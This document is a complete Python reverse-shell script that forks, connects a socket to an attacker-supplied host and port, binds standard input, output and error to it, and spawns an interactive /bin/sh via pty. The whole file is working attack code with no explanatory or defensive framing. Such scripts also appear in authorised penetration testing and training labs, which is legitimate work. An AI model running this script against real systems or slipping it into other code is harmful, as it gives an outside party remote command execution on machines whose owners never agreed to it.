#!/usr/bin/env python3
import os
import socket
import sys
import pty

if os.fork() == 0:
    cb = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cb.connect((sys.argv[1], int(sys.argv[2])))

    os.dup2(cb.fileno(), 0)
    os.dup2(cb.fileno(), 1)
    os.dup2(cb.fileno(), 2)

    pty.spawn("/bin/sh")

    cb.close()
